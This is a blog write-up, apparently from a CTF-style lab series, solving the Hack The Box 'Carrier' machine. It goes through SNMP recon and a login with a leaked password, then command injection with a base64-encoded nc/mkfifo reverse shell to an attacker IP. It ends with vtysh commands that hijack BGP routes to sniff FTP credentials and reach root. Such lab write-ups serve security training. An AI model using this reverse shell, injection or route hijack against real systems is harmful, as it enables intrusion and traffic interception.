@@ -1,0 +1,363 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Carrier - Hack The Box</title>
+  <meta name="description" content="Resolution of the Carrier machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Carrier - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/carrier">
+  <meta property="og:description" content="Resolution of the Carrier machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/carrier">
+  <meta name="twitter:title" content="Carrier - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Carrier machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/carrier/carrier-00-053b06c7b93c47271480f3ba9d8ccbcda25d9321992c14f7e38e22c9919119ae.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/carrier/carrier-00-053b06c7b93c47271480f3ba9d8ccbcda25d9321992c14f7e38e22c9919119ae.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Carrier - Hack The Box</h1>
+            <p>Resolution of the Carrier machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    April 19, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      4 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/carrier/carrier-00-053b06c7b93c47271480f3ba9d8ccbcda25d9321992c14f7e38e22c9919119ae.png">
+  <img src="/assets/hackthebox/carrier/carrier-00-053b06c7b93c47271480f3ba9d8ccbcda25d9321992c14f7e38e22c9919119ae.png" alt="Carrier Banner" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-00-053b06c7b93c47271480f3ba9d8ccbcda25d9321992c14f7e38e22c9919119ae.png" data-zooming-width="597" data-zooming-height="380" />
+</a></p>
+
+<p>Carrier is a middle-level machine based on Linux, the main focus of the machine is the <code class="highlighter-rouge">network</code> related stuff. Since the user exploitation, we have a web application dedicated to monitor the network, then in the post exploitation we have a really <code class="highlighter-rouge">challenging privilege escalation</code> stage, going through <code class="highlighter-rouge">pivoting</code> to get last flag.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Starting Nmap 7.70 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-21 09:11 <span class="nt">-03</span>
+Warning: 10.10.10.105 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span><span class="nb">.</span>
+Stats: 0:08:55 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing UDP Scan
+UDP Scan Timing: About 73.63% <span class="k">done</span><span class="p">;</span> ETC: 09:23 <span class="o">(</span>0:03:12 remaining<span class="o">)</span>
+Stats: 0:10:26 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing UDP Scan
+UDP Scan Timing: About 82.77% <span class="k">done</span><span class="p">;</span> ETC: 09:24 <span class="o">(</span>0:02:10 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.105
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 826 closed ports, 173 open|filtered ports
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>890.44 seconds</code></pre></figure>
+
+<p>The SNMP port is open, we can see if there’s some interesting strings from the device using the tool <code class="highlighter-rouge">snmpwalk</code></p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-01-484ed1632c968d71ebeec48f2bf2f99cc785d4129dbfb37dfc3a81891993b3de.png">
+  <img src="/assets/hackthebox/carrier/carrier-01-484ed1632c968d71ebeec48f2bf2f99cc785d4129dbfb37dfc3a81891993b3de.png" alt="Carrier Web" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-01-484ed1632c968d71ebeec48f2bf2f99cc785d4129dbfb37dfc3a81891993b3de.png" data-zooming-width="385" data-zooming-height="48" />
+</a></p>
+
+<p>On /docs, verifying the file that has a manual with errors, the error 450009 is somehow related to the SNMP string that we got earlier.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-02-c9f6d0d68bece4243078546af6cbe99bc91d3b3256cc1f3b1a55d65f44bbb13e.png">
+  <img src="/assets/hackthebox/carrier/carrier-02-c9f6d0d68bece4243078546af6cbe99bc91d3b3256cc1f3b1a55d65f44bbb13e.png" alt="Carrier Web" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-02-c9f6d0d68bece4243078546af6cbe99bc91d3b3256cc1f3b1a55d65f44bbb13e.png" data-zooming-width="431" data-zooming-height="462" />
+</a></p>
+
+<p>It’s possible to login into the web application using the login <code class="highlighter-rouge">admin</code> and the password <code class="highlighter-rouge">NET_45JDX23</code>.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-03-eb29bf50968d5a31336ba2bf13d5c173429e1ef73ea230a3a002d32c645718cf.png">
+  <img src="/assets/hackthebox/carrier/carrier-03-eb29bf50968d5a31336ba2bf13d5c173429e1ef73ea230a3a002d32c645718cf.png" alt="Carrier Web" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-03-eb29bf50968d5a31336ba2bf13d5c173429e1ef73ea230a3a002d32c645718cf.png" data-zooming-width="875" data-zooming-height="495" />
+</a></p>
+
+<h1 id="exploiting---command-injection-on-the-web-application">Exploiting - Command Injection on the Web Application</h1>
+
+<p>Doing a small recon we can see that there’s a button that verifies which services the user <code class="highlighter-rouge">quagga</code> is executing right now.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-04-ea1a8c39fcaf3619a497f83b91c87e1c6620caf0a76b572165ef90e5b5655a33.png">
+  <img src="/assets/hackthebox/carrier/carrier-04-ea1a8c39fcaf3619a497f83b91c87e1c6620caf0a76b572165ef90e5b5655a33.png" alt="Carrier Exploit" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-04-ea1a8c39fcaf3619a497f83b91c87e1c6620caf0a76b572165ef90e5b5655a33.png" data-zooming-width="671" data-zooming-height="321" />
+</a></p>
+
+<p>Analyzing the request we can deduct that the output of the Diagnostics function command is something similar to:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ps aux | <span class="nb">grep </span>quagga</code></pre></figure>
+
+<p>By knowing the command used to generate the output we can dig a little deep into the request parameters and see if we can inject some commands into it.
+Let’s append a new command on it and send to the server (you need to base64-encode the command)</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ps aux | <span class="nb">grep </span>quagga<span class="p">;</span><span class="nb">id</span></code></pre></figure>
+
+<p>After send this we noticed that the vulnerability is exploitable so the next step is craft our reverse shell payload, encode and send to the server.</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"quagga;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 4444 &gt;/tmp/f"</span> | <span class="nb">base64</span>
+<span class="c"># cXVhZ2dhO3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjE0IDQ0NDQgPi90bXAvZgo</span></code></pre></figure>
+
+<p>I made a script that exploits this vulnerability, automating the whole process of login and command injection and it comes with an interactive shell.
+The script is available on my GitHub.</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/carrier" target="_blank">Carrier Exploit</a></p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-05-f4328fe8bf261862d092de7d826886c225b77d1eecaf350b5e84f11397a47ffc.png">
+  <img src="/assets/hackthebox/carrier/carrier-05-f4328fe8bf261862d092de7d826886c225b77d1eecaf350b5e84f11397a47ffc.png" alt="Carrier Exploit" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-05-f4328fe8bf261862d092de7d826886c225b77d1eecaf350b5e84f11397a47ffc.png" data-zooming-width="793" data-zooming-height="203" />
+</a></p>
+
+<h1 id="post-exploitation---pivoting-to-another-network">Post Exploitation - Pivoting to another network</h1>
+
+<p>The privilege escalation is a bit challenging on this box, because it needs a solid network knowledge about router management, routes, etc.</p>
+
+<p>Doing a small recon we can see that there’s a tool named <code class="highlighter-rouge">vtysh</code>, responsible for managing the network.</p>
+
+<p>The image above was obtained during the recon process and it show the actual network map, with 3 different networks: <code class="highlighter-rouge">AS100</code>, <code class="highlighter-rouge">AS200</code> and <code class="highlighter-rouge">AS300</code>.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-06-9b4d9762a1b600ff12d1e0e5bf4883fa0dbd37564599ff6647cf2e61ceb21b99.png">
+  <img src="/assets/hackthebox/carrier/carrier-06-9b4d9762a1b600ff12d1e0e5bf4883fa0dbd37564599ff6647cf2e61ceb21b99.png" alt="Carrier Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-06-9b4d9762a1b600ff12d1e0e5bf4883fa0dbd37564599ff6647cf2e61ceb21b99.png" data-zooming-width="500" data-zooming-height="470" />
+</a></p>
+
+<p>Back to the recon on the web application, in the <code class="highlighter-rouge">tickets</code> we can see that there’s a ticket saying that the network <code class="highlighter-rouge">10.120.15.0/24</code> has a leak problem on the <code class="highlighter-rouge">FTP service</code>.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-07-7464b23a86fa21c531ac4cf6832429f29380d3ccd9195252d2ab306e8c385535.png">
+  <img src="/assets/hackthebox/carrier/carrier-07-7464b23a86fa21c531ac4cf6832429f29380d3ccd9195252d2ab306e8c385535.png" alt="Carrier Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-07-7464b23a86fa21c531ac4cf6832429f29380d3ccd9195252d2ab306e8c385535.png" data-zooming-width="831" data-zooming-height="146" />
+</a></p>
+
+<p>The information lead us to an attack named <code class="highlighter-rouge">BGP Route Hijacking</code>, where the attacker hijack the gateway between two networks, making him the <code class="highlighter-rouge">Man In The Middle</code>, sniffing the whole traffic.</p>
+
+<p>More information about BHP Route Hijacking: <a href="https://blogs.akamai.com/2018/11/bgp-route-hijacking.html" target="_blank">BGP Route Hijacking by Akamai</a></p>
+
+<p>All we need to do is change the route using the <code class="highlighter-rouge">vtysh</code> tool:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">configure terminal
+ip prefix-list 0xdf permit 10.120.15.0/25
+route-map to-as200 permit 10
+match ip address prefix-list 0xdf
+<span class="nb">set </span>community no-export
+route-map to-as200 permit 20
+route-map to-as300 deny 10
+match ip address prefix-list 0xdf
+route-map to-as300 permit 20
+router bgp 100
+network 10.120.15.0 mask 255.255.255.128
+end
+clear ip bgp <span class="k">*</span></code></pre></figure>
+
+<p>After that we can intercept the port 21, grab the plaintext password and login as root on SSH, finishing the box.</p>
+
+<p><a href="/assets/hackthebox/carrier/carrier-08-d8e699bc26f0b5a97bbf31eb31e4c436f921e2c42cc1b2c4ec032a91eb9d8481.png">
+  <img src="/assets/hackthebox/carrier/carrier-08-d8e699bc26f0b5a97bbf31eb31e4c436f921e2c42cc1b2c4ec032a91eb9d8481.png" alt="Carrier Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/carrier/carrier-08-d8e699bc26f0b5a97bbf31eb31e4c436f921e2c42cc1b2c4ec032a91eb9d8481.png" data-zooming-width="1266" data-zooming-height="378" />
+</a></p>
+
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Carrier+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/carrier%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/carrier" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
